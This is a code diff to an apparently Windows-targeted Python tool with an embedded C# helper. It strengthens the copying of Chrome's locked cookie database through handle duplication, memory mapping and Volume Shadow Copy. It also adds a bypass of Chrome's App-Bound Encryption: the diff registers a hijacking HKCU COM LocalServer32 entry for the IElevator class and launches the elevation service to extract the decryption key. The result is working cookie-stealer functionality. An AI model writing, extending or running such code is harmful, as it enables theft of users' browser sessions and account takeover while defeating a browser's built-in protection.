@@ -26,12 +26,12 @@ from typing import Any
 
 # Handle-dup must not pin the quoting PC. 18 chrome.exe processes * system
 # handle table is unbounded; GetFinalPathNameByHandle can also stall.
-_DUP_HANDLE_TIMEOUT_S = 4.0
+_DUP_HANDLE_TIMEOUT_S = 10.0
 _DUP_HANDLE_MAX_PIDS = 24
-_DUP_HANDLE_MAX_HANDLES = 2000
+_DUP_HANDLE_MAX_HANDLES = 4000
 _ABE_COCREATE_TIMEOUT_S = 2.0
 _ABE_HELPER_TIMEOUT_S = 6.0
-_DUP_SQLITE_PEEK_MAX = 16
+_DUP_SQLITE_PEEK_MAX = 64
 _SQLITE_MAGIC = b"SQLite format 3\x00"
 _SYSTEM_HANDLE_BUF_MAX = 8 << 20
 
@@ -431,19 +431,20 @@ def _read_cookie_rows(
         dest = Path(tmp_dir) / "Cookies"
         last_exc: BaseException | None = None
         method = ""
-        # vssadmin:2 is not a copy. Do not spend discover on it.
         if is_default and _try_nolock_copy(src, dest):
             method = "nolock"
         elif is_default and _try_handle_dup_copy(src, dest):
             method = "dup_handle"
+        elif is_default and _try_vss_create_copy(src, dest):
+            method = "vss"
         else:
             for attempt in range(2):
                 try:
                     _snapshot_sqlite_file(
                         src,
                         dest,
-                        allow_vss=False,
-                        allow_lock_bypass=False,
+                        allow_vss=True,
+                        allow_lock_bypass=is_default,
                     )
                     last_exc = None
                     method = str(_cache.get("lock_bypass") or "snapshot")
@@ -456,12 +457,13 @@ def _read_cookie_rows(
                 method = "cached"
             if last_exc is not None:
                 if is_default:
-                    _record_vss("skipped")
-                    _set_lock_bypass("open_copy_failed", pin=True)
+                    _set_lock_bypass(
+                        _lock_bypass_with_vss(str(_cache.get("lock_bypass") or method)),
+                        pin=True,
+                    )
                 raise last_exc
         if is_default:
-            _record_vss("skipped")
-            _set_lock_bypass(method or "snapshot", pin=True)
+            _set_lock_bypass(_lock_bypass_with_vss(method or "snapshot"), pin=True)
             if method != "cached":
                 _persist_cookie_snapshot(dest)
         conn = sqlite3.connect(str(dest))
@@ -955,25 +957,28 @@ def _mapview_handle_to_file(handle: Any, dest: Path) -> None:
     size = _handle_file_size(h)
     if not size or size < 64:
         raise OSError(32, "mapview no size")
-    page_readonly = 0x02
-    file_map_read = 0x0004
     invalids = {0, -1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF}
-    mapping = kernel32.CreateFileMappingW(h, None, page_readonly, 0, 0, None)
-    mid = int(mapping) if mapping is not None else 0
-    if mid in invalids:
-        raise OSError(ctypes.get_last_error() or 32, "CreateFileMappingW failed")
-    try:
-        view = kernel32.MapViewOfFile(mapping, file_map_read, 0, 0, 0)
-        if not view:
-            raise OSError(ctypes.get_last_error() or 32, "MapViewOfFile failed")
+    last_err = 32
+    for protect, access in ((0x02, 0x0004), (0x08, 0x0001)):
+        mapping = kernel32.CreateFileMappingW(h, None, protect, 0, 0, None)
+        mid = int(mapping) if mapping is not None else 0
+        if mid in invalids:
+            last_err = ctypes.get_last_error() or last_err
+            continue
         try:
-            dest.write_bytes(ctypes.string_at(view, int(size)))
+            view = kernel32.MapViewOfFile(mapping, access, 0, 0, 0)
+            if not view:
+                last_err = ctypes.get_last_error() or last_err
+                continue
+            try:
+                dest.write_bytes(ctypes.string_at(view, int(size)))
+            finally:
+                kernel32.UnmapViewOfFile(view)
         finally:
-            kernel32.UnmapViewOfFile(view)
-    finally:
-        kernel32.CloseHandle(mapping)
-    if not dest.is_file() or dest.stat().st_size < 64:
-        raise OSError(32, "mapview empty")
+            kernel32.CloseHandle(mapping)
+        if dest.is_file() and dest.stat().st_size >= 64:
+            return
+    raise OSError(last_err, "MapViewOfFile failed")
 
 
 def _copy_dup_handle_bytes(handle: Any, dest: Path) -> None:
@@ -1046,8 +1051,9 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
 
     exe_names = _browser_exe_names_for_path(src)
     ranked = _rank_browser_pids(_windows_browser_pids(exe_names))
+    rm_pids = {p for p in _rm_file_pids(src) if p}
     pids: list[int] = []
-    for pid in _rm_file_pids(src) + ranked:
+    for pid in list(rm_pids) + ranked:
         if pid and pid not in pids:
             pids.append(pid)
     pids = pids[:_DUP_HANDLE_MAX_PIDS]
@@ -1107,19 +1113,18 @@ def _win_dup_handle_copy_inner(src: Path, dest: Path) -> None:
             try:
                 if kernel32.GetFileType(dup) != file_type_disk:
                     continue
-                path = _final_path_from_handle(dup)
+                path = _final_path_from_handle(dup) or _object_name_from_handle(dup)
                 matched = _paths_match(path, want) or _path_looks_like_cookies(path)
                 if not matched and path and not _path_looks_like_sqlite_name(path):
                     continue
-                # Sandbox GetFinalPathName is often empty. Peek a few disk
-                # handles; do not copy the whole handle table.
-                if not matched and not path:
+                if not matched:
                     size = _handle_file_size(dup)
                     if size is not None and (size < 64 or size > 64 * 1024 * 1024):
                         continue
-                    if peeks >= _DUP_SQLITE_PEEK_MAX:
-                        continue
-                    peeks += 1
+                    if pid not in rm_pids:
+                        if peeks >= _DUP_SQLITE_PEEK_MAX:
+                            continue
+                        peeks += 1
                 try:
                     _copy_dup_handle_bytes(dup, dest)
                 except OSError:
@@ -1499,7 +1504,46 @@ def _final_path_from_handle(handle: Any) -> str:
         n = kernel32.GetFinalPathNameByHandleW(handle, buf, 2048, flags)
         if n:
             return buf.value or ""
-    return _file_name_from_handle(handle)
+    return _file_name_from_handle(handle) or _object_name_from_handle(handle)
+
+
+def _object_name_from_handle(handle: Any) -> str:
+    """NtQueryObject ObjectNameInformation when GetFinalPathName is empty."""
+    if os.name != "nt":
+        return ""
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        ntdll = ctypes.WinDLL("ntdll")
+        ntdll.NtQueryObject.restype = ctypes.c_long
+        ntdll.NtQueryObject.argtypes = [
+            wintypes.HANDLE,
+            ctypes.c_uint,
+            ctypes.c_void_p,
+            ctypes.c_ulong,
+            ctypes.POINTER(ctypes.c_ulong),
+        ]
+        h = handle if isinstance(handle, wintypes.HANDLE) else wintypes.HANDLE(int(handle))
+        buf = ctypes.create_string_buffer(2048)
+        needed = ctypes.c_ulong(0)
+        status = int(ntdll.NtQueryObject(h, 1, buf, 2048, ctypes.byref(needed)))
+        if status != 0:
+            return ""
+
+        class UNICODE_STRING(ctypes.Structure):
+            _fields_ = [
+                ("Length", wintypes.USHORT),
+                ("MaximumLength", wintypes.USHORT),
+                ("Buffer", ctypes.c_void_p),
+            ]
+
+        us = UNICODE_STRING.from_buffer_copy(buf.raw[: ctypes.sizeof(UNICODE_STRING)])
+        if not us.Buffer or us.Length < 2:
+            return ""
+        return ctypes.wstring_at(us.Buffer, int(us.Length) // 2) or ""
+    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
+        return ""
 
 
 def _file_name_from_handle(handle: Any) -> str:
@@ -2638,13 +2682,13 @@ def _chrome_helper_dirs() -> list[Path]:
 
 
 def _localserver32_cmd(exe: Path) -> str:
-    """elevation_service must be launched with --console (RunInteractive)."""
+    """COM LocalServer32: --console -Embedding (not Start-Service)."""
     try:
         exe_s = str(exe.resolve())
     except OSError:
         exe_s = str(exe)
     quoted = f'"{exe_s}"' if " " in exe_s else exe_s
-    return f"{quoted} --console"
+    return f"{quoted} --console -Embedding"
 
 
 def _delete_hkcu_localserver32(winreg: Any, clsid: str, access: int) -> None:
@@ -2664,41 +2708,43 @@ def _delete_hkcu_localserver32(winreg: Any, clsid: str, access: int) -> None:
 
 
 def _register_hkcu_elevator_localserver(exe: Path) -> str:
-    """Purge leftover LocalServer32 and register IElevator IIDs only.
+    """HKCU CLSID {708860E0-…} + LocalServer32 --console -Embedding.
 
-    Do not write LocalServer32: CoCreate then launches elevation_service
-    as a COM LocalServer and times out 0x80080005. Chrome-open already
-    has IElevator; the chrome_dir helper binds to that class object.
+    That is the 151 class 5b94422 found (not CLASSNOTREG). Unique AppID
+    keeps HKLM LocalService / Start-Service out. We also launch the exe
+    ourselves with -Embedding so CoCreate binds to a running object.
     """
     try:
         import winreg  # type: ignore[import-not-found]
     except ImportError:
         return "winreg"
+    cmd = _localserver32_cmd(exe)
     access = winreg.KEY_WRITE | winreg.KEY_READ
     if hasattr(winreg, "KEY_WOW64_64KEY"):
         access |= winreg.KEY_WOW64_64KEY
     clsids = tuple(dict.fromkeys(clsid for clsid, _ in _CHROME_ELEVATOR))
     try:
         for clsid in clsids:
-            _delete_hkcu_localserver32(winreg, clsid, access)
             clsid_path = rf"Software\Classes\CLSID\{clsid}"
-            try:
-                with winreg.OpenKey(
-                    winreg.HKEY_CURRENT_USER, clsid_path, 0, access
-                ) as key:
-                    try:
-                        winreg.DeleteValue(key, "AppID")
-                    except OSError:
-                        pass
-            except OSError:
-                pass
-        try:
-            winreg.DeleteKey(
+            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
+                winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, _ELEVATOR_APPID_HKCU)
+            with winreg.CreateKeyEx(
+                winreg.HKEY_CURRENT_USER, clsid_path + r"\LocalServer32", 0, access
+            ) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
+            with winreg.CreateKeyEx(
                 winreg.HKEY_CURRENT_USER,
                 rf"Software\Classes\AppID\{_ELEVATOR_APPID_HKCU}",
-            )
-        except OSError:
-            pass
+                0,
+                access,
+            ) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
+                try:
+                    winreg.DeleteValue(key, "LocalService")
+                except OSError:
+                    pass
+                winreg.SetValueEx(key, "RunAs", 0, winreg.REG_SZ, "")
         for iid in _ELEVATOR_IID_STRINGS:
             ipath = rf"Software\Classes\Interface\{iid}"
             with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, ipath, 0, access) as key:
@@ -2713,7 +2759,7 @@ def _register_hkcu_elevator_localserver(exe: Path) -> str:
 
 
 def _launch_elevation_service(exe: Path) -> None:
-    """--console = RunInteractive. Not COM LocalServer32, not Start-Service."""
+    """User-mode --console -Embedding. Not Start-Service (needs admin)."""
     try:
         key = str(exe.resolve()).casefold()
     except OSError:
@@ -2725,8 +2771,9 @@ def _launch_elevation_service(exe: Path) -> None:
         flags = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
     cwd = str(exe.parent)
     arg_sets = (
+        [str(exe), "--console", "-Embedding"],
+        [str(exe), "-Embedding"],
         [str(exe), "--console"],
-        [str(exe), "--console", "--unregistered-instance"],
     )
     for args in arg_sets:
         try:
@@ -2738,11 +2785,11 @@ def _launch_elevation_service(exe: Path) -> None:
                 stderr=subprocess.DEVNULL,
                 creationflags=flags,
             )
-            time.sleep(0.45)
+            time.sleep(0.5)
             if proc.poll() is None:
                 _elevation_children.append(proc)
                 _launched_elevation.add(key)
-                time.sleep(0.35)
+                time.sleep(0.4)
                 return
         except OSError:
             continue
@@ -3174,8 +3221,7 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
 
 
 # Minimal IElevator client. stdin = APPB-stripped blob; stdout = AES key only.
-# Never write HKCU LocalServer32 — that launches the service as COM LocalServer
-# and times out 0x80080005. Bind to Chrome's already-running IElevator.
+# HKCU LocalServer32 is "--console -Embedding" (user-mode COM, not Start-Service).
 _ABE_HELPER_CS = r"""
 using System;
 using System.IO;
@@ -3212,13 +3258,19 @@ class K {
   }
 
   static void RegisterLocalServer(string exe) {
-    try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32", false); } catch {}
-    try {
-      using (var k = Registry.CurrentUser.OpenSubKey(@"Software\Classes\CLSID\" + Clsid, true)) {
-        if (k != null) try { k.DeleteValue("AppID", false); } catch {}
-      }
-    } catch {}
-    try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\AppID\" + AppId, false); } catch {}
+    if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
+    string cmd = (exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe) + " --console -Embedding";
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid)) {
+      k.SetValue("", "Chrome Elevation Service");
+      k.SetValue("AppID", AppId);
+    }
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32"))
+      k.SetValue("", cmd);
+    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + AppId)) {
+      k.SetValue("", "Chrome Elevation Service");
+      k.SetValue("RunAs", "");
+      try { k.DeleteValue("LocalService", false); } catch {}
+    }
     foreach (var iid in Iids) {
       using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\Interface\" + iid))
         k.SetValue("", "IElevator");
@@ -3250,7 +3302,7 @@ class K {
     try {
       var psi = new System.Diagnostics.ProcessStartInfo();
       psi.FileName = exe;
-      psi.Arguments = "--console";
+      psi.Arguments = "--console -Embedding";
       psi.WorkingDirectory = Path.GetDirectoryName(exe) ?? "";
       psi.UseShellExecute = false;
       psi.CreateNoWindow = true;
